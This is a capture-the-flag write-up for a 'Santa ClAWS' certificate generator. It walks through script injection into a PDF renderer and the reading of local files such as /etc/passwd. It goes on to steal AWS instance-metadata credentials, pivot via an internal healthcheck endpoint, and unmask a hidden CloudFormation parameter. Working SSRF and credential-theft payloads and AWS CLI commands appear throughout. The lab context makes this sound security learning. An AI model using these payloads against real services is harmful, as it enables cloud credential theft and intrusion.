# Level-7 - Santa ClAWS

DESCRIPTION

We’ve intercepted traffic between Spectre’s internal networks and a mysterious seasonal web service called Santa ClAWS Certificate Generator — a portal used to issue “Naughty” or “Nice” certificates for festive felines.

This seemingly innocent site may be hiding something deeper — a covert cloud operations backend.

Scratch beneath the surface. Unravel the yarn of lies. Every cat may hold a clue.

http://santa-claws.chals.tisc25.ctf.sg or http://13.229.55.236
*The actual IP is provided in the event that the DNS cache is not refreshed yet; they are one and the same server.

---


So we are given a website and this is what it looked like:

<img width="1084" height="911" alt="image" src="https://github.com/user-attachments/assets/d627da3b-0e71-4e94-b1ae-909935b151d7" />

When you generate any normal pdf, you become a certified good kitty :3.

<img width="622" height="843" alt="image" src="https://github.com/user-attachments/assets/a3d601d5-1479-4678-b27d-1d1806010683" />

I tried a very basic payload like

```
<iframe src="http://localhost" width="800" height="600"></iframe>
```

and I was able to get something, but when I try to source from the local files, I get a WebKit error 102.

So after searching online, I came across this useful [website](https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c) and learnt that I could use scripts to include local files.

```
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write((this.responseText))};
x.open("GET","file:///etc/passwd");
x.send()
</script>
```

Searching about AWS also lead me to find out that the secuirty credentials for a service are usually written in http://169.254.169.254/latest/meta-data/iam/security-credentials/ + &lt;role&gt; and how you get your role name is by
sending a token to http://169.254.169.254/latest/meta-data/iam/security-credentials/ and how you get your token is sending a put request to http://169.254.169.254/latest/api/token with the header 'X-aws-ec2-metadata-token-ttl-seconds'.

But placing it my script just returns me an internal server error. So I guess I had to search for more stuff...

By pressing Control + U, I found this in the page source,
```
<!-- TODO: Verify the systemd service config for runtime ports (done) -->
```

suggesting that there is something on some port that is listening for some stuff.

So I tried to look in file:///proc/self/environ but there was nothing, then I tried file:///etc/environment and found:

```
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"
REVERSE_PROXY_PORT=45198
```
~~Honestly, I just guessed and eventually~~ I deduced that the web server was running a local reverse-proxy to the EC2 instance metadata service (IMDS) on that port so I sent a put request to http://localhost:45198/latest/api/token with

```
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write((this.responseText))};
x.open("PUT","http://localhost:45198/latest/api/token");
x.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
x.send()
</script>
```

and I received a token :O.

With the token I can finally get some creds with a new payload

```
<script>
var tok = new XMLHttpRequest();
tok.onload = function() {
    var role = new XMLHttpRequest();
    role.onload = function() {
    var creds = new XMLHttpRequest();
        creds.onload = function() {
	    document.write(this.responseText);
        };
        creds.open("GET", 'http://127.0.0.1:45198/latest/meta-data/iam/security-credentials/' + this.responseText);
        creds.setRequestHeader('X-aws-ec2-metadata-token', tok.responseText);
        creds.send();
    };
    role.open("GET", 'http://127.0.0.1:45198/latest/meta-data/iam/security-credentials');
    role.setRequestHeader('X-aws-ec2-metadata-token', this.responseText);
    role.send();
};
tok.open("PUT", 'http://127.0.0.1:45198/latest/api/token');
tok.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
tok.send();
</script>
```
But i faced an issue where the token went out of bounds 
<img width="976" height="80" alt="image" src="https://github.com/user-attachments/assets/1938887c-1fec-4c0a-8e32-08819cd5dc3c" />
so I changed the font size to 1px with 

```
document.write('<style>body{font-size:1px}</style>' + this.responseText);
```

<img width="953" height="30" alt="image" src="https://github.com/user-attachments/assets/ae9b2cee-4e05-4e97-af5b-3817ccb06c14" />


Now it was finally time to download aws on my powershell.

So I set my keys with aws configure in powershell and I followed this [website](https://medium.com/legionhunters/hacking-the-cloud-unveiling-secrets-in-aws-ctf-challenges-5edc9259688c) and copied their commands they used in a challenge and prayed they work.

After trying a bunch of commands, secretsmanager list-secrets worked

```
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:ap-southeast-1:533267020068:secret:internal_web_api_key-mj8au2-U5o6lT",
            "Name": "internal_web_api_key-mj8au2",
            "Description": "To access internal web apis",
            "LastChangedDate": "2025-09-24T01:06:33.419000+08:00",
            "LastAccessedDate": "2025-09-28T08:00:00+08:00",
            "SecretVersionsToStages": {
                "terraform-20250923170633383800000003": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2025-09-24T01:06:31.528000+08:00"
        }
    ]
}
```
I could then get the value with aws secretsmanager get-secret-value --secret-id internal_web_api_key-mj8au2
```
{
    "ARN": "arn:aws:secretsmanager:ap-southeast-1:533267020068:secret:internal_web_api_key-mj8au2-U5o6lT",
    "Name": "internal_web_api_key-mj8au2",
    "VersionId": "terraform-20250923170633383800000003",
    "SecretString": "{\"api_key\":\"Uqv2JgVFhKtTsNUTyeqDkmwcjgWrar8s\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2025-09-24T01:06:33.415000+08:00"
}
```
So this hints the existence of another service.

So I searched what other commands I could try, ec2 describe-instances worked

```
...
"IamInstanceProfile": {
                        "Arn": "arn:aws:iam::533267020068:instance-profile/internal-ec2",
                        "Id": "AIPAXYKJQ7ESB5WJU52GM"
                    },
                    "NetworkInterfaces": [
                        {
                            "Attachment": {
                                "AttachTime": "2025-09-23T17:08:32+00:00",
                                "AttachmentId": "eni-attach-001a7a0fdb91ff4f6",
                                "DeleteOnTermination": false,
                                "DeviceIndex": 0,
                                "Status": "attached",
                                "NetworkCardIndex": 0
                            },
                            "Description": "",
                            "Groups": [
                                {
                                    "GroupId": "sg-01a9216c63a2cf89d",
                                    "GroupName": "internal-ec2-sg"
                                }
                            ],
                            "Ipv6Addresses": [],
                            "MacAddress": "06:34:29:16:59:29",
                            "NetworkInterfaceId": "eni-09b43256b74cea5cb",
                            "OwnerId": "533267020068",
                            "PrivateDnsName": "ip-172-31-73-190.ap-southeast-1.compute.internal",
                            "PrivateIpAddress": "172.31.73.190",
                            "PrivateIpAddresses": [
                                {
                                    "Primary": true,
                                    "PrivateDnsName": "ip-172-31-73-190.ap-southeast-1.compute.internal",
                                    "PrivateIpAddress": "172.31.73.190"
                                }
                            ],
...
```
and I received more info about the other service.

The [website](https://medium.com/legionhunters/hacking-the-cloud-unveiling-secrets-in-aws-ctf-challenges-5edc9259688c) also was able to find a flag by checking the directories of its own s3 bucket, but I needed to find the name of my bucket.

I tried various local files until I hit /var/log/cloud-init-output.log and was greeted with a 97 page PDF... 

But I just used Control + F and searched for "s3://" in order to find the name of the bucket and found these lines:

```
s3://claws-web-setup-bucket/app.zip to home/ubuntu/app.zip Archive: /home/ubuntu/app.zip creating: /home/ubuntu/app/ inflating:
/home/ubuntu/app/requirements.txt creating: /home/ubuntu/app/static/ inflating:
/home/ubuntu/app/static/certificate.png inflating: /home/ubuntu/app/static/index-bg.svg inflating:
/home/ubuntu/app/app.py
```

I ran 
```
aws s3 ls s3://claws-web-setup-bucket
```

and got 
```
2025-09-24 01:26:22    1179262 app.zip
2025-09-24 01:06:34         34 flag1.txt
```
Damn flag1.txt..., no wonder there is another instance.

Running

```
aws s3 cp s3://claws-web-setup-bucket/flag1.txt ./flag1.txt
cat .\flag1.txt
```
gives me TISC{iMPURrf3C7_sSRFic473_Si73_4nd

So I guess its time for the next part... 

So I injected a new payload

```
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write((this.responseText))};
x.open("GET","http://172.31.73.190");
x.send()
</script>
```
and it actually worked, lol, but the html is rendered tho.

So I used a new payload where I just created a new document and set its text to the responseText.

```
<script>
var x=new XMLHttpRequest();
x.onload=function(){
	document.open();
	document.write('<pre id=o style="margin:0;white-space:pre-wrap"></pre>');
	document.close();
	o.textContent=this.responseText
};
x.open('GET','http://172.31.73.190');x.send();
</script>
```
and then I got 

```
<!DOCTYPE html>
<html lang="en">
<head>
<title>CloudOps Internal Tool</title>
<style>
body {
font-family: Arial, sans-serif;
padding: 2rem;
background-color: #f4f4f4;
}
h1 {
color: #333;
}
#stack_status, #health_status {
margin-top: 20px;
font-weight: bold;
}
.note {
font-size: 0.9em;
color: #666;
}
</style>
<!-- TODO: Complete internal site -->
<script>
const params = new URLSearchParams(window.location.search);
window.api_key = params.get("api_key");
</script>
</head>
<body>
<h1>CloudOps Stack Deployer</h1>
<p>This internal tool allows devs to trigger standard infrastructure stacks via pre-approved templates.</p>
<button onclick="get_stack()">Deploy Stack</button>
<div id="stack_status">Status: Waiting for deployment...</div>
<hr>
<h2>Healthcheck URL</h2>
<input type="text" id="url_input" placeholder="http://example.com" size="50" />
<button onclick="check_url()">Check URL</button>
<div id="health_status">Status: Waiting for input...</div>
<p class="note">Note: All deployments are logged and monitored for compliance.</p>
<script src="/main.js"></script>
</body>
</html>
```

In the html, it mentions a /main.js, so I just placed the /main.js after the ip and sent the payload again and got

```
const statusEl = document.getElementById("stack_status");
const healthStatusEl = document.getElementById("health_status");
const urlInput = document.getElementById("url_input");
function get_stack() {
fetch(`/api/generate-stack?api_key=${apiKey}`)
.then(res => res.json())
.then(data => {
if (data.stackId) {
statusEl.textContent = `Stack created: ${data.stackId}`;
} else {
statusEl.textContent = `Error: ${data.error || 'Unknown'}`;
console.error(data);
}
})
.catch(err => {
statusEl.textContent = "Request failed";
console.error(err);
});
}
function check_url() {
const url = urlInput.value;
if (!url) {
healthStatusEl.textContent = "Please enter a URL";
return;
}
fetch(`/api/healthcheck?url=${encodeURIComponent(url)}`)
.then(res => res.json())
.then(data => {
if (data.status === "up") {
healthStatusEl.textContent = "Site is up";
} else {
healthStatusEl.textContent = `Site is down: ${data.error}`;
}
})
.catch(err => {
healthStatusEl.textContent = "Healthcheck failed";
console.error(err);
});
}
```

Since we already know our role name, from listing instances earlier, we use a payload to use the /api/healthcheck request to get infomation regarding our credentials

```
<script>
var x=new XMLHttpRequest();
x.onload=function(){
	document.open();
	document.write('<pre id=o style="margin:0;white-space:pre-wrap"></pre>');
	document.close();
	o.textContent=this.responseText
};
x.open('GET','http://172.31.73.190/api/healthcheck?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/internal-ec2/');
x.send();
</script>

```
and now our token goes out of bounds again

<img width="969" height="61" alt="image" src="https://github.com/user-attachments/assets/58d4993a-1813-4c9f-aa3b-7b4e7d87c366" />

but this time I realised I could put word wrapping in our new document by adding the "word-break:break-word" declaration in its style.

<img width="961" height="261" alt="image" src="https://github.com/user-attachments/assets/252b2a71-040e-44c3-8587-d96200267ea7" />

Now I used aws again and set the new credentials up.

So ~~by randomly trying things~~, by considering that the api allows us to make stacks I tried to make a stack also by changing the url in the payload to 'http://172.31.73.190/api/generate-stack?api_key=Uqv2JgVFhKtTsNUTyeqDkmwcjgWrar8s'

```
{"stackId":"arn:aws:cloudformation:ap-southeast-1:533267020068:stack/pawxy-sandbox-0570121c/4ade64a0-9d3d-11f0-be97-06fd013a2c11"}
```

Knowing our stackID, I tried to run

```
aws cloudformation describe-stacks --stack-name pawxy-sandbox-0570121c
```

and it actually works, giving us 

```
STACKS  2025-09-29T14:05:02.459000+00:00        Flag part 2
        True    False   arn:aws:cloudformation:ap-southeast-1:533267020068:stack/pawxy-sandbox-0570121c/4ade64a0-9d3d-11f0-be97-06fd013a2c11    pawxy-sandbox-0570121c  CREATE_FAILED   The following resource(s) failed to create: [AppDataStore].
CAPABILITIES    CAPABILITY_IAM
DRIFTINFORMATION        NOT_CHECKED
PARAMETERS      flagpt2 ****
```

My neurons connected and I remembered another [website](https://infosecwriteups.com/pentesting-cloud-part-2-is-there-an-echo-in-here-ctf-walkthrough-54ec188a585d) I cam across when I was searching about cloud CTFs that had the same-ish challenge.

So I just needed to get my stack's template file, removed the NoEcho and update my stack with the new template file.

Running
```
aws cloudformation get-template --stack-name pawxy-sandbox-0570121c
```
gives 
```
AWSTemplateFormatVersion: '2010-09-09'
Description: >
  Flag part 2
  
Parameters:
  flagpt2:
    Type: String
      
Resources:
  AppDataStore:
    Type: AWS::S3::Bucket
    Properties:
      BucketName: !Sub app-data-sandbox-bucket

STAGESAVAILABLE Original
STAGESAVAILABLE Processed
```
So I copied this entire thing into newtemplate.yaml the removed the NoEcho specifier and the STAGESAVAILABLE thingies.

Then after modifying the command from the [website](https://infosecwriteups.com/pentesting-cloud-part-2-is-there-an-echo-in-here-ctf-walkthrough-54ec188a585d), I ran

```
aws cloudformation update-stack --stack-name pawxy-sandbox-0570121c --template-body file://newtemplate.yaml --disable-rollback --parameters ParameterKey=flagpt2,UsePreviousValue=true
```

and it actually went through.

So now when we run
```
cloudformation describe-stacks --stack-name pawxy-sandbox-0570121c
```
we get
```
STACKS  2025-09-29T14:05:02.459000+00:00        Flag part 2
        True    False   2025-09-29T14:31:20.621000+00:00        arn:aws:cloudformation:ap-southeast-1:533267020068:stack/pawxy-sandbox-0570121c/4ade64a0-9d3d-11f0-be97-06fd013a2c11    pawxy-sandbox-0570121c  UPDATE_FAILED   The following resource(s) failed to create: [AppDataStore].
CAPABILITIES    CAPABILITY_IAM
DRIFTINFORMATION        NOT_CHECKED
PARAMETERS      flagpt2 _c47_4S7r0PHiC_fL4w5}
```

FLAG: TISC{iMPURrf3C7_sSRFic473_Si73_4nd_c47_4S7r0PHiC_fL4w5}







